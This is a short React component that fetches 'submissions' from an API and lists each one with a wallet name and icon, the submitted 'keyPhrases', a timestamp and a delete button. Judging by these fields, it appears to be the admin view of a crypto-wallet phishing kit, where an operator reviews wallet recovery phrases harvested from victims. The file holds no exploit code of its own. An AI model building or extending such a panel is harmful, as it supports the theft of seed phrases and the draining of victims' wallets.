import React, { useState, useEffect } from "react";

const SubmissionsPage = () => {
  const [submissions, setSubmissions] = useState([]);

  useEffect(() => {
    const fetchSubmissions = async () => {
      try {
        const response = await fetch("/api/submissions");
        const data = await response.json();
        setSubmissions(data.submissions);
      } catch (error) {
        console.error("Error fetching submissions:", error);
      }
    };

    fetchSubmissions();
  }, []);

  const handleDelete = async (timestamp) => {
    try {
      await fetch("/api/submissions", {
        method: "DELETE",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ timestamp }),
      });

      // Update the UI by filtering out the deleted submission
      setSubmissions((prev) =>
        prev.filter((submission) => submission.timestamp !== timestamp)
      );
    } catch (error) {
      console.error("Error deleting submission:", error);
    }
  };

  return (
    <div className="submissions-container">
      <h2>Submissions</h2>
      {submissions.length === 0 ? (
        <p>No submissions found.</p>
      ) : (
        submissions.map((submission, index) => (
          <div key={index} className="submission-card">
            <div className="wallet-info">
              <img src={submission.wallet.icon} alt={submission.wallet.name} />
              <h3>{submission.wallet.name}</h3>
            </div>
            <p>{submission.keyPhrases}</p>
            <small>{new Date(submission.timestamp).toLocaleString()}</small>
            <button onClick={() => handleDelete(submission.timestamp)}>
              Delete
            </button>
          </div>
        ))
      )}
    </div>
  );
};

export default SubmissionsPage;
